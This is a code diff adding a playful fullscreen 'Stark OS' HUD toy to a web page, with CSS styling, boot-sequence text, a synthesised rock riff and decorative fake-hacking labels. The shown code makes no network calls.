@@ -1935,6 +1935,593 @@
         radial-gradient(ellipse 70% 55% at 50% 50%, rgba(255, 255, 255, 0.6),  transparent 70%),
         linear-gradient(135deg, #fff7ed 0%, #fef3f2 50%, #f0fdfa 100%);
     }
+
+    /* ──────────────────────────────────────────────
+       Stark — Tony Stark-style HUD boot + fullscreen
+       ────────────────────────────────────────────── */
+    .stark-root {
+      --s-fg:   #7ee7ff;
+      --s-hot:  #ffb347;
+      --s-red:  #ff5b5b;
+      --s-mut:  rgba(126, 231, 255, 0.4);
+      --s-bord: rgba(126, 231, 255, 0.25);
+      position: relative;
+      width: 100%;
+      min-height: 72vh;
+      border-radius: 14px;
+      overflow: hidden;
+      background:
+        radial-gradient(ellipse 60% 40% at 50% 30%, rgba(126, 231, 255, 0.1), transparent 60%),
+        radial-gradient(ellipse 50% 30% at 80% 90%, rgba(255, 179, 71, 0.07), transparent 60%),
+        linear-gradient(180deg, #040914 0%, #020509 100%);
+      color: var(--s-fg);
+      font-family: var(--font-mono);
+      user-select: none;
+      -webkit-user-select: none;
+      isolation: isolate;
+      box-shadow: inset 0 0 0 1px var(--s-bord), inset 0 0 60px rgba(126, 231, 255, 0.05);
+    }
+    .stark-root.stark-takeover,
+    .stark-root:fullscreen,
+    .stark-root:-webkit-full-screen {
+      position: fixed !important;
+      inset: 0 !important;
+      z-index: 9999 !important;
+      width: 100vw !important;
+      height: 100vh !important;
+      min-height: 100vh !important;
+      border-radius: 0 !important;
+      box-shadow: none !important;
+    }
+    body.stark-fullscreen { overflow: hidden; }
+    body.stark-fullscreen .spotlight,
+    body.stark-fullscreen .bg-grid { display: none; }
+
+    .stark-scan {
+      position: absolute; inset: 0; pointer-events: none; z-index: 1;
+      background: repeating-linear-gradient(180deg,
+        transparent 0, transparent 2px,
+        rgba(126, 231, 255, 0.05) 2px, rgba(126, 231, 255, 0.05) 3px);
+      mix-blend-mode: screen; opacity: 0.8;
+    }
+    .stark-gridlayer {
+      position: absolute; inset: 0; pointer-events: none; z-index: 1;
+      background:
+        linear-gradient(to right,  rgba(126, 231, 255, 0.08) 1px, transparent 1px) 0 0 / 40px 40px,
+        linear-gradient(to bottom, rgba(126, 231, 255, 0.08) 1px, transparent 1px) 0 0 / 40px 40px;
+      mask-image: radial-gradient(ellipse 70% 60% at 50% 50%, black 50%, transparent 95%);
+      -webkit-mask-image: radial-gradient(ellipse 70% 60% at 50% 50%, black 50%, transparent 95%);
+    }
+    .stark-corners i {
+      position: absolute; width: 24px; height: 24px;
+      border: 2px solid var(--s-fg); opacity: 0.5; z-index: 2; pointer-events: none;
+    }
+    .stark-corners i:nth-child(1) { top: 12px; left: 12px;  border-right: none; border-bottom: none; }
+    .stark-corners i:nth-child(2) { top: 12px; right: 12px; border-left:  none; border-bottom: none; }
+    .stark-corners i:nth-child(3) { bottom: 12px; left: 12px;  border-right: none; border-top: none; }
+    .stark-corners i:nth-child(4) { bottom: 12px; right: 12px; border-left:  none; border-top: none; }
+
+    .stark-stage { position: relative; z-index: 2; }
+    .stark-stage[hidden] { display: none; }
+
+    .stark-pre {
+      min-height: inherit;
+      padding: 3rem 2rem;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      gap: 1rem; text-align: center;
+    }
+    .stark-root:fullscreen .stark-pre,
+    .stark-root.stark-takeover .stark-pre { min-height: 100vh; }
+    .stark-pre-title {
+      font-size: clamp(2rem, 6vw, 3.5rem);
+      letter-spacing: 0.45em;
+      font-weight: 800;
+      color: var(--s-fg);
+      text-shadow: 0 0 22px rgba(126, 231, 255, 0.55);
+    }
+    .stark-pre-sub {
+      color: var(--s-mut); font-size: 0.8rem; letter-spacing: 0.3em;
+    }
+    .stark-pre-hint {
+      color: var(--s-mut); font-size: 0.65rem; letter-spacing: 0.2em;
+      text-transform: uppercase; margin-top: 0.5rem;
+    }
+    .stark-start {
+      position: relative;
+      width: 180px; height: 180px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 50% 45%,
+        rgba(126, 231, 255, 0.4), rgba(126, 231, 255, 0.08) 55%, transparent 70%);
+      border: 2px solid var(--s-fg);
+      color: var(--s-fg);
+      font-family: var(--font-mono); font-size: 1.05rem; letter-spacing: 0.3em;
+      cursor: pointer;
+      transition: transform 0.25s var(--ease), box-shadow 0.25s var(--ease);
+      box-shadow: 0 0 0 0 rgba(126, 231, 255, 0.25),
+                  inset 0 0 30px rgba(126, 231, 255, 0.15);
+      margin: 0.5rem 0;
+    }
+    .stark-start:hover {
+      transform: scale(1.04);
+      box-shadow: 0 0 0 10px rgba(126, 231, 255, 0.12),
+                  inset 0 0 40px rgba(126, 231, 255, 0.25);
+    }
+    .stark-start:disabled { opacity: 0.5; cursor: not-allowed; }
+    .stark-start-ring {
+      position: absolute; inset: 10px;
+      border: 1px solid var(--s-mut); border-top-color: var(--s-fg);
+      border-radius: 50%;
+      animation: starkSpin 10s linear infinite;
+    }
+    @keyframes starkSpin { to { transform: rotate(360deg); } }
+
+    .stark-boot {
+      padding: 3rem clamp(1.5rem, 5vw, 4rem);
+      min-height: inherit;
+      display: flex; flex-direction: column; gap: 1rem;
+      font-size: 0.82rem;
+    }
+    .stark-root:fullscreen .stark-boot,
+    .stark-root.stark-takeover .stark-boot { min-height: 100vh; }
+    .stark-boot-head {
+      display: flex; justify-content: space-between;
+      color: var(--s-mut); letter-spacing: 0.2em; font-size: 0.65rem;
+      padding-bottom: 0.75rem;
+      border-bottom: 1px solid var(--s-bord);
+    }
+    .stark-boot-lines {
+      display: flex; flex-direction: column; gap: 0.35rem;
+      flex: 1;
+    }
+    .stark-boot-line {
+      display: grid; grid-template-columns: auto 1fr auto;
+      gap: 0.5rem;
+      color: var(--s-mut); opacity: 0.6;
+    }
+    .stark-boot-line-done { color: var(--s-fg); opacity: 1; }
+    .stark-boot-line-done > span:last-child { color: var(--s-hot); }
+    .stark-boot-track {
+      height: 10px;
+      border: 1px solid var(--s-bord);
+      border-radius: 2px; overflow: hidden;
+    }
+    .stark-boot-fill {
+      height: 100%; width: 0%;
+      background: linear-gradient(90deg, var(--s-fg), var(--s-hot));
+      box-shadow: 0 0 14px rgba(126, 231, 255, 0.5);
+      transition: width 0.3s linear;
+    }
+    .stark-boot-pct {
+      text-align: right; letter-spacing: 0.3em; color: var(--s-fg);
+      font-variant-numeric: tabular-nums;
+    }
+
+    .stark-hud {
+      display: grid;
+      grid-template-rows: auto 1fr auto;
+      min-height: 72vh;
+      position: relative;
+      overflow: hidden;
+    }
+    .stark-root:fullscreen .stark-hud,
+    .stark-root.stark-takeover .stark-hud { min-height: 100vh; }
+    .stark-topbar {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0.9rem 1.5rem;
+      border-bottom: 1px solid var(--s-bord);
+      letter-spacing: 0.25em;
+      font-size: 0.8rem;
+      gap: 1rem;
+    }
+    .stark-brand {
+      color: var(--s-fg);
+      text-shadow: 0 0 8px rgba(126, 231, 255, 0.5);
+    }
+    .stark-clock {
+      color: var(--s-hot);
+      font-variant-numeric: tabular-nums;
+      letter-spacing: 0.2em;
+    }
+    .stark-quit {
+      width: 32px; height: 32px;
+      border: 1px solid var(--s-bord); border-radius: 50%;
+      color: var(--s-fg); cursor: pointer;
+      transition: border-color 0.2s, color 0.2s;
+      display: inline-flex; align-items: center; justify-content: center;
+      font-size: 0.9rem;
+    }
+    .stark-quit:hover { border-color: var(--s-red); color: var(--s-red); }
+
+    .stark-main {
+      display: grid;
+      grid-template-columns: 280px 1fr 280px;
+      gap: 1rem;
+      padding: 1rem 1.5rem;
+      overflow: hidden;
+    }
+    @media (max-width: 900px) {
+      .stark-main { grid-template-columns: 1fr; padding: 1rem; }
+      .stark-center { min-height: 300px !important; }
+    }
+
+    .stark-col { display: flex; flex-direction: column; gap: 0.75rem; }
+    .stark-panel {
+      padding: 0.75rem 0.9rem;
+      border: 1px solid var(--s-bord);
+      border-radius: 3px;
+      background: rgba(126, 231, 255, 0.035);
+      position: relative;
+    }
+    .stark-panel::before {
+      content: ''; position: absolute; top: -1px; left: 16px;
+      width: 24px; height: 2px; background: var(--s-fg);
+      box-shadow: 0 0 8px var(--s-fg);
+    }
+    .stark-panel-title {
+      font-size: 0.62rem; letter-spacing: 0.28em; color: var(--s-mut);
+      margin-bottom: 0.5rem;
+    }
+    .stark-bar-row {
+      display: grid; grid-template-columns: 36px 1fr 44px;
+      gap: 0.5rem; align-items: center;
+      font-size: 0.72rem;
+      margin: 0.3rem 0;
+      font-variant-numeric: tabular-nums;
+    }
+    .stark-bar {
+      height: 6px; background: rgba(126, 231, 255, 0.1);
+      border-radius: 2px; overflow: hidden;
+    }
+    .stark-bar > div {
+      height: 100%;
+      background: linear-gradient(90deg, var(--s-fg), var(--s-hot));
+      transition: width 0.6s var(--ease);
+      box-shadow: 0 0 8px rgba(126, 231, 255, 0.5);
+    }
+    .stark-readout {
+      display: flex; justify-content: space-between;
+      font-size: 0.72rem; margin: 0.25rem 0;
+    }
+    .stark-readout span { color: var(--s-mut); }
+    .stark-readout b {
+      color: var(--s-fg); font-weight: 600;
+      font-variant-numeric: tabular-nums;
+    }
+
+    .stark-center {
+      position: relative;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 360px;
+      border: 1px solid var(--s-bord); border-radius: 3px;
+      background: rgba(0, 0, 0, 0.2);
+      overflow: hidden;
+    }
+    .stark-reactor {
+      position: relative;
+      width: min(260px, 65%); aspect-ratio: 1;
+      border-radius: 50%;
+    }
+    .stark-reactor-core {
+      position: absolute; inset: 36%;
+      border-radius: 50%;
+      background: radial-gradient(circle, #ffffff 0%, var(--s-fg) 40%, transparent 75%);
+      box-shadow: 0 0 40px rgba(126, 231, 255, 0.8), 0 0 80px rgba(126, 231, 255, 0.4);
+      animation: starkCore 1.4s ease-in-out infinite;
+    }
+    @keyframes starkCore {
+      0%, 100% { transform: scale(1);   opacity: 1;   }
+      50%      { transform: scale(1.1); opacity: 0.8; }
+    }
+    .stark-reactor-ring {
+      position: absolute; border: 1px solid var(--s-fg);
+      border-radius: 50%; opacity: 0.5;
+    }
+    .stark-r1 { inset: 0;   border-style: dashed; animation: starkSpin 18s linear infinite; }
+    .stark-r2 { inset: 12%; border-top-color: transparent; border-bottom-color: transparent;
+                animation: starkSpin 10s linear infinite reverse; }
+    .stark-r3 { inset: 22%; border-left-color: transparent; border-right-color: transparent;
+                animation: starkSpin 14s linear infinite; }
+    .stark-reactor-tick {
+      position: absolute; inset: -6px;
+      border-radius: 50%;
+      background: conic-gradient(from 0deg, transparent 0 355deg, var(--s-fg) 355deg 360deg);
+      mask: radial-gradient(circle, transparent 70%, black 71% 74%, transparent 75%);
+      -webkit-mask: radial-gradient(circle, transparent 70%, black 71% 74%, transparent 75%);
+      animation: starkSpin 4s linear infinite;
+    }
+
+    .stark-radar {
+      position: absolute; right: 1.5rem; bottom: 1.5rem;
+      width: 110px; height: 110px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(126, 231, 255, 0.08) 0, transparent 70%);
+      border: 1px solid var(--s-bord);
+      overflow: hidden;
+    }
+    .stark-radar-ring {
+      position: absolute; inset: 0;
+      border: 1px solid var(--s-mut); border-radius: 50%; opacity: 0.4;
+    }
+    .stark-radar-ring:nth-of-type(2) { inset: 22%; }
+    .stark-radar-ring:nth-of-type(3) { inset: 44%; }
+    .stark-radar-sweep {
+      position: absolute; inset: 0;
+      background: conic-gradient(from 0deg, rgba(126, 231, 255, 0.55) 0deg, transparent 60deg);
+      border-radius: 50%;
+      animation: starkSpin 3s linear infinite;
+      mix-blend-mode: screen;
+    }
+    .stark-radar-blip {
+      position: absolute; width: 6px; height: 6px; margin: -3px 0 0 -3px;
+      background: var(--s-hot); border-radius: 50%;
+      box-shadow: 0 0 8px var(--s-hot);
+      animation: starkBlip 1.8s ease-in-out infinite;
+    }
+    .stark-radar-blip.fx-new { animation: starkBlipNew 2s ease-out forwards; }
+    @keyframes starkBlip { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
+    @keyframes starkBlipNew {
+      0%   { transform: scale(2.4); opacity: 1; }
+      40%  { transform: scale(1);   opacity: 1; }
+      100% { transform: scale(1);   opacity: 0; }
+    }
+    .stark-center-lbl {
+      position: absolute; top: 1rem; left: 50%;
+      transform: translateX(-50%);
+      font-size: 0.7rem; letter-spacing: 0.3em;
+      color: var(--s-fg);
+      padding: 0.25rem 0.75rem;
+      border: 1px solid var(--s-bord);
+      background: rgba(0, 0, 0, 0.4);
+      transition: color 0.2s, border-color 0.2s;
+      white-space: nowrap;
+      max-width: calc(100% - 4rem);
+      overflow: hidden; text-overflow: ellipsis;
+    }
+    .stark-center-lbl.stark-center-hot {
+      color: var(--s-hot); border-color: var(--s-hot);
+    }
+
+    .stark-log {
+      display: flex; flex-direction: column;
+      gap: 0.2rem;
+      font-size: 0.72rem;
+      max-height: 220px;
+      overflow: hidden;
+    }
+    .stark-log-row {
+      display: grid; grid-template-columns: 60px 1fr;
+      gap: 0.5rem;
+      color: var(--s-fg);
+      animation: starkFade 0.3s ease-out;
+    }
+    .stark-log-row span:first-child {
+      color: var(--s-mut); font-variant-numeric: tabular-nums;
+    }
+    @keyframes starkFade {
+      from { opacity: 0; transform: translateX(-6px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    .stark-schema {
+      width: 100%; display: block;
+      color: var(--s-fg);
+      filter: drop-shadow(0 0 4px rgba(126, 231, 255, 0.35));
+      animation: starkSchema 6s ease-in-out infinite;
+    }
+    @keyframes starkSchema {
+      0%, 100% { opacity: 0.95; }
+      50%      { opacity: 0.55; }
+    }
+
+    .stark-footer {
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 1rem;
+      padding: 0.75rem 1.5rem;
+      border-top: 1px solid var(--s-bord);
+      font-size: 0.68rem;
+      letter-spacing: 0.2em;
+    }
+    .stark-ticker {
+      flex: 1; color: var(--s-fg); opacity: 0.75;
+      overflow: hidden; white-space: nowrap; text-overflow: ellipsis;
+    }
+    .stark-hint { color: var(--s-mut); white-space: nowrap; }
+
+    /* Hijack terminals — spawn on keypress */
+    .stark-term {
+      position: absolute;
+      width: 340px;
+      max-width: calc(100% - 24px);
+      background: rgba(5, 10, 14, 0.95);
+      border: 1px solid rgba(126, 231, 255, 0.4);
+      border-radius: 6px;
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: #8af5a5;
+      box-shadow:
+        0 18px 40px -10px rgba(0, 0, 0, 0.7),
+        0 0 0 1px rgba(126, 231, 255, 0.15),
+        0 0 30px rgba(126, 231, 255, 0.12);
+      opacity: 0;
+      transform: scale(0.92) translateY(6px);
+      animation: starkTermIn 0.28s cubic-bezier(0.2, 0.8, 0.3, 1.05) forwards;
+      overflow: hidden;
+      display: flex; flex-direction: column;
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      z-index: 5;
+    }
+    .stark-term.stark-term-closing {
+      animation: starkTermOut 0.3s ease-out forwards;
+    }
+    @keyframes starkTermIn {
+      0%   { opacity: 0; transform: scale(0.9) translateY(10px) rotate(-1deg); }
+      60%  { opacity: 1; transform: scale(1.02) translateY(-2px) rotate(0.4deg); }
+      100% { opacity: 1; transform: scale(1) translateY(0) rotate(0); }
+    }
+    @keyframes starkTermOut {
+      0%   { opacity: 1; transform: scale(1); }
+      100% { opacity: 0; transform: scale(0.96) translateY(-4px); filter: blur(2px); }
+    }
+    .stark-term-bar {
+      display: flex; align-items: center; gap: 0.5rem;
+      padding: 0.4rem 0.65rem;
+      background: linear-gradient(180deg, rgba(126, 231, 255, 0.1), rgba(126, 231, 255, 0.03));
+      border-bottom: 1px solid rgba(126, 231, 255, 0.2);
+      color: var(--s-fg);
+      font-size: 0.65rem;
+      letter-spacing: 0.15em;
+    }
+    .stark-term-dots { display: flex; gap: 5px; }
+    .stark-term-dots i {
+      width: 9px; height: 9px; border-radius: 50%;
+      background: #ff5f57; border: 1px solid rgba(0,0,0,0.2);
+    }
+    .stark-term-dots i:nth-child(2) { background: #febc2e; }
+    .stark-term-dots i:nth-child(3) { background: #28c840; }
+    .stark-term-title {
+      flex: 1;
+      text-align: center;
+      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+      color: var(--s-fg);
+      text-shadow: 0 0 6px rgba(126, 231, 255, 0.35);
+    }
+    .stark-term-body {
+      padding: 0.5rem 0.65rem 0.65rem;
+      height: 220px;
+      overflow: hidden;
+      background:
+        repeating-linear-gradient(180deg,
+          transparent 0, transparent 2px,
+          rgba(126, 231, 255, 0.025) 2px, rgba(126, 231, 255, 0.025) 3px);
+      line-height: 1.5;
+      position: relative;
+    }
+    .stark-term-body::after {
+      content: '';
+      position: absolute; left: 0; right: 0; bottom: 0; height: 30px;
+      background: linear-gradient(180deg, transparent, rgba(5, 10, 14, 0.95));
+      pointer-events: none;
+    }
+    .stark-term-line {
+      white-space: pre-wrap; word-break: break-word;
+      animation: starkTermLine 0.18s ease-out;
+    }
+    .stark-term-line.stark-tl-cmd   { color: #bafff0; }
+    .stark-term-line.stark-tl-warn  { color: var(--s-hot); }
+    .stark-term-line.stark-tl-err   { color: var(--s-red); }
+    .stark-term-line.stark-tl-ok    { color: #8af5a5; }
+    .stark-term-line.stark-tl-dim   { color: rgba(138, 245, 165, 0.55); }
+    .stark-term-line.stark-tl-meta  { color: var(--s-fg); }
+    .stark-term-prompt { color: #28c840; margin-right: 0.35rem; }
+    .stark-term-caret {
+      display: inline-block; width: 7px; height: 0.95em;
+      background: #8af5a5; margin-left: 2px;
+      animation: starkCaret 0.7s steps(2, end) infinite;
+      vertical-align: -2px;
+    }
+    @keyframes starkCaret { 50% { opacity: 0; } }
+    @keyframes starkTermLine {
+      from { opacity: 0; transform: translateX(-4px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    .stark-overlay {
+      position: absolute; inset: 0; z-index: 10;
+      display: flex; align-items: center; justify-content: center;
+      pointer-events: none; opacity: 0;
+      background: radial-gradient(circle, rgba(126, 231, 255, 0.18), rgba(0, 0, 0, 0.35));
+      transition: opacity 0.15s;
+    }
+    .stark-overlay.fx-show { opacity: 1; }
+    .stark-overlay > div {
+      font-family: var(--font-mono);
+      font-size: clamp(1.25rem, 4vw, 2.5rem);
+      letter-spacing: 0.2em;
+      color: var(--s-fg);
+      text-shadow: 0 0 16px rgba(126, 231, 255, 0.8);
+      padding: 0.9rem 1.8rem;
+      border: 2px solid var(--s-fg);
+      background: rgba(0, 0, 0, 0.7);
+      animation: starkOverlayPop 0.8s ease-out;
+    }
+    @keyframes starkOverlayPop {
+      0%   { transform: scale(0.82); opacity: 0; }
+      20%  { transform: scale(1.04); opacity: 1; }
+      100% { transform: scale(1);    opacity: 1; }
+    }
+
+    .stark-target {
+      position: absolute;
+      width: 80px; height: 80px;
+      margin: -40px 0 0 -40px;
+      border: 2px solid var(--s-red);
+      border-radius: 50%;
+      box-shadow: 0 0 14px rgba(255, 91, 91, 0.6), inset 0 0 14px rgba(255, 91, 91, 0.4);
+      animation: starkTarget 1.4s ease-out forwards;
+      pointer-events: none;
+    }
+    .stark-target::before, .stark-target::after {
+      content: ''; position: absolute; background: var(--s-red);
+    }
+    .stark-target::before { left: 50%; margin-left: -1px; top: -12px;  bottom: -12px; width: 2px; }
+    .stark-target::after  { top:  50%; margin-top:  -1px; left: -12px; right:  -12px; height: 2px; }
+    @keyframes starkTarget {
+      0%   { transform: scale(2);   opacity: 0; }
+      25%  { transform: scale(1);   opacity: 1; }
+      100% { transform: scale(1);   opacity: 0; }
+    }
+
+    .stark-root.fx-flash { animation: starkFlash 0.22s ease-out; }
+    @keyframes starkFlash {
+      0%   { filter: brightness(1); }
+      40%  { filter: brightness(2.2) contrast(1.2); }
+      100% { filter: brightness(1); }
+    }
+    .stark-root.fx-shake { animation: starkShake 0.5s; }
+    @keyframes starkShake {
+      0%, 100% { transform: translate(0); }
+      10% { transform: translate(-6px, -2px); }
+      25% { transform: translate(5px, 3px);   }
+      40% { transform: translate(-4px, 4px);  }
+      55% { transform: translate(6px, -2px);  }
+      70% { transform: translate(-5px, -4px); }
+      85% { transform: translate(3px, 4px);   }
+    }
+    .stark-root.fx-scan::after {
+      content: ''; position: absolute; inset: 0;
+      pointer-events: none; z-index: 9;
+      background: linear-gradient(180deg,
+        transparent 0%,
+        rgba(126, 231, 255, 0.35) 49%, rgba(126, 231, 255, 0.35) 51%,
+        transparent 100%);
+      animation: starkScanSweep 1s ease-in-out;
+    }
+    @keyframes starkScanSweep {
+      0%   { transform: translateY(-100%); }
+      100% { transform: translateY(100%); }
+    }
+    .stark-root.fx-glitch { animation: starkGlitch 0.4s steps(3, end); }
+    @keyframes starkGlitch {
+      0%, 100% { transform: translate(0); filter: hue-rotate(0deg); }
+      20% { transform: translate(-4px, 2px); filter: hue-rotate(40deg) saturate(1.6); }
+      40% { transform: translate(5px, -3px); filter: hue-rotate(-30deg); }
+      60% { transform: translate(-3px, 3px); filter: hue-rotate(50deg); }
+      80% { transform: translate(2px, -2px); filter: hue-rotate(-20deg); }
+    }
+    .stark-reactor.fx-pulse { animation: starkReactorPulse 0.8s ease-out; }
+    @keyframes starkReactorPulse {
+      0%   { transform: scale(1); }
+      30%  { transform: scale(1.18); filter: drop-shadow(0 0 40px rgba(255, 179, 71, 0.9)); }
+      100% { transform: scale(1); filter: none; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .stark-reactor-core, .stark-r1, .stark-r2, .stark-r3, .stark-reactor-tick,
+      .stark-radar-sweep, .stark-start-ring, .stark-schema {
+        animation: none !important;
+      }
+    }
   </style>
 </head>
 <body>
@@ -2684,6 +3271,12 @@
         desc: 'A friendly button appears somewhere on the board. Tap it to make it pop with a random chime, then another one shows up.',
         group: 'Fun',
         custom: renderPop
+      },
+      {
+        id: 'stark', label: 'Stark OS', icon: 'atom',
+        desc: 'Go fullscreen, boot a J.A.R.V.I.S.-style HUD with rock music, then hit random keys to look like you\'re saving the world.',
+        group: 'Fun',
+        custom: renderStark
       }
     ];
 
@@ -2745,7 +3338,7 @@
        Home page: tools teaser
        ───────────────────────────────────────────── */
     function renderTeaser() {
-      const featured = ['splash', 'pop', 'length', 'temperature', 'volume', 'numbers'];
+      const featured = ['splash', 'pop', 'stark', 'length', 'temperature', 'numbers'];
       const teaser = document.getElementById('toolsTeaser');
       teaser.innerHTML = featured.map(id => {
         const t = toolById[id];
@@ -4112,6 +4705,870 @@ reviewers:
           try { audioCtx.close(); } catch (_) {}
           audioCtx = null;
         }
+      };
+    }
+
+    /* ─────────────────────────────────────────────
+       Stark OS — fullscreen J.A.R.V.I.S.-style HUD.
+       Boot sequence + synthesised rock riff + random
+       "cool effects" on keypress. Pure browser: no
+       audio files, no network — just WebAudio.
+       ───────────────────────────────────────────── */
+    function renderStark(root) {
+      const BOOT_LINES = [
+        'Spooling arc reactor ........... ',
+        'Neural uplink .................. ',
+        'JARVIS core v4.17.1 ............ ',
+        'Mk XLII diagnostics ............ ',
+        'SHIELD telemetry ............... ',
+        'SAT-GRID tether ................ ',
+        'Bypassing firewall ............. ',
+        'Encrypting uplink .............. ',
+        'HUD pipeline ................... ',
+        'Nanobot integrity .............. ',
+        'Welcome back, sir .............. '
+      ];
+
+      const HACK_VERBS = [
+        'TRIANGULATING', 'DECRYPTING', 'INJECTING', 'ROUTING',
+        'OVERRIDING', 'BYPASSING', 'UPLOADING', 'COMPILING',
+        'CROSS-REFERENCING', 'INTERCEPTING', 'RECALIBRATING',
+        'INITIATING', 'DEPLOYING', 'HOT-PATCHING', 'SANDBOXING'
+      ];
+      const HACK_TARGETS = [
+        'SHIELD MAINFRAME', 'STARK R&D', 'ROXXON SUBNET',
+        'DRONE CLUSTER 7', 'HAMMER DEFENSE GRID', 'SAT-9 UPLINK',
+        'MK XLII NANOBOTS', 'PENTAGON COMMS', 'JARVIS CORE',
+        'TONY.STARK.LOCAL', 'EDITH NETWORK', 'FRIDAY ASSISTANT',
+        'NY POWER GRID', 'ULTRON CACHE', 'VIBRANIUM REGISTRY'
+      ];
+      const OVERLAY_PHRASES = [
+        'ACCESS GRANTED', 'CHECKSUM VALIDATED', 'PAYLOAD DELIVERED',
+        'CONNECTION STABLE', 'ALL SYSTEMS NOMINAL', 'HANDSHAKE COMPLETE',
+        'FIREWALL BYPASSED', 'SIGNAL LOCKED', 'TARGET ACQUIRED',
+        'ENCRYPTION SYNCED', 'BACKUP SEALED', 'COMMAND ACCEPTED'
+      ];
+
+      // Power-chord riff roots, fast rock tempo, loops forever.
+      const RIFF_BPM = 148;
+      const RIFF = [
+        82.41, 82.41, 82.41,  98.00, 110.00, 82.41,
+        82.41, 82.41, 82.41, 110.00,  98.00, 82.41,
+        82.41, 98.00, 110.00, 123.47
+      ];
+
+      root.innerHTML = `
+        <div class="stark-root" data-stage="pre">
+          <div class="stark-scan" aria-hidden="true"></div>
+          <div class="stark-gridlayer" aria-hidden="true"></div>
+          <div class="stark-corners" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
+
+          <div class="stark-stage stark-pre" data-stage-pre>
+            <h1 class="stark-pre-title">J.A.R.V.I.S.</h1>
+            <p class="stark-pre-sub">STARK OS · v4.17.1 · OFFLINE</p>
+            <button class="stark-start" type="button" data-start>
+              <span class="stark-start-ring"></span>
+              <span>INITIATE</span>
+            </button>
+            <p class="stark-pre-hint">Fullscreen · rock music · press ESC to exit</p>
+          </div>
+
+          <div class="stark-stage stark-boot" data-stage-boot hidden>
+            <div class="stark-boot-head">
+              <span>STARK INDUSTRIES — INTERNAL USE ONLY</span>
+              <span data-boot-clock>00:00:00</span>
+            </div>
+            <div class="stark-boot-lines" data-boot-lines></div>
+            <div class="stark-boot-track"><div class="stark-boot-fill" data-boot-fill></div></div>
+            <div class="stark-boot-pct" data-boot-pct>00%</div>
+          </div>
+
+          <div class="stark-stage stark-hud" data-stage-hud hidden>
+            <header class="stark-topbar">
+              <div class="stark-brand">J · A · R · V · I · S</div>
+              <div class="stark-clock" data-hud-clock>00:00:00</div>
+              <button class="stark-quit" type="button" data-quit aria-label="Exit">✕</button>
+            </header>
+
+            <div class="stark-main">
+              <aside class="stark-col">
+                <div class="stark-panel">
+                  <div class="stark-panel-title">VITALS</div>
+                  <div class="stark-bar-row"><span>CPU</span><div class="stark-bar"><div data-bar="cpu" style="width:12%"></div></div><span data-val="cpu">12%</span></div>
+                  <div class="stark-bar-row"><span>MEM</span><div class="stark-bar"><div data-bar="mem" style="width:34%"></div></div><span data-val="mem">34%</span></div>
+                  <div class="stark-bar-row"><span>NET</span><div class="stark-bar"><div data-bar="net" style="width:71%"></div></div><span data-val="net">71%</span></div>
+                  <div class="stark-bar-row"><span>PWR</span><div class="stark-bar"><div data-bar="pwr" style="width:97%"></div></div><span data-val="pwr">97%</span></div>
+                </div>
+                <div class="stark-panel">
+                  <div class="stark-panel-title">READOUTS</div>
+                  <div class="stark-readout"><span>LAT</span><b>40.7580° N</b></div>
+                  <div class="stark-readout"><span>LON</span><b>73.9855° W</b></div>
+                  <div class="stark-readout"><span>ALT</span><b>14,372 ft</b></div>
+                  <div class="stark-readout"><span>SPD</span><b>482 kn</b></div>
+                  <div class="stark-readout"><span>TMP</span><b>−52 °C</b></div>
+                </div>
+              </aside>
+
+              <section class="stark-center">
+                <div class="stark-reactor" data-reactor>
+                  <div class="stark-reactor-core"></div>
+                  <div class="stark-reactor-ring stark-r1"></div>
+                  <div class="stark-reactor-ring stark-r2"></div>
+                  <div class="stark-reactor-ring stark-r3"></div>
+                  <div class="stark-reactor-tick"></div>
+                </div>
+                <div class="stark-radar">
+                  <span class="stark-radar-ring"></span>
+                  <span class="stark-radar-ring"></span>
+                  <span class="stark-radar-ring"></span>
+                  <span class="stark-radar-sweep"></span>
+                  <span class="stark-radar-blip" style="left:70%;top:40%;"></span>
+                  <span class="stark-radar-blip" style="left:30%;top:62%;"></span>
+                </div>
+                <div class="stark-center-lbl" data-center-lbl>ALL SYSTEMS NOMINAL</div>
+              </section>
+
+              <aside class="stark-col">
+                <div class="stark-panel">
+                  <div class="stark-panel-title">EVENT LOG</div>
+                  <div class="stark-log" data-log></div>
+                </div>
+                <div class="stark-panel">
+                  <div class="stark-panel-title">SCHEMATIC</div>
+                  <svg class="stark-schema" viewBox="0 0 200 160" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <g fill="none" stroke="currentColor" stroke-width="1">
+                      <path d="M100 20 L140 45 L145 95 L120 135 L80 135 L55 95 L60 45 Z"/>
+                      <path d="M70 70 L95 70 L95 85 L70 82 Z"/>
+                      <path d="M105 70 L130 70 L130 82 L105 85 Z"/>
+                      <path d="M85 108 L115 108 L110 120 L90 120 Z"/>
+                      <circle cx="100" cy="150" r="3"/>
+                      <path d="M100 20 V10 M60 50 H40 M140 50 H160"/>
+                      <path d="M30 140 H50 M150 140 H170"/>
+                    </g>
+                  </svg>
+                </div>
+              </aside>
+            </div>
+
+            <footer class="stark-footer">
+              <div class="stark-ticker" data-ticker></div>
+              <div class="stark-hint">PRESS ANY KEY · ESC TO EXIT</div>
+            </footer>
+
+            <div class="stark-overlay" data-overlay aria-hidden="true">
+              <div data-overlay-text></div>
+            </div>
+          </div>
+        </div>
+      `;
+
+      const host       = root.querySelector('.stark-root');
+      const preEl      = root.querySelector('[data-stage-pre]');
+      const bootEl     = root.querySelector('[data-stage-boot]');
+      const hudEl      = root.querySelector('[data-stage-hud]');
+      const startBtn   = root.querySelector('[data-start]');
+      const quitBtn    = root.querySelector('[data-quit]');
+      const bootLines  = root.querySelector('[data-boot-lines]');
+      const bootFill   = root.querySelector('[data-boot-fill]');
+      const bootPct    = root.querySelector('[data-boot-pct]');
+      const bootClock  = root.querySelector('[data-boot-clock]');
+      const hudClock   = root.querySelector('[data-hud-clock]');
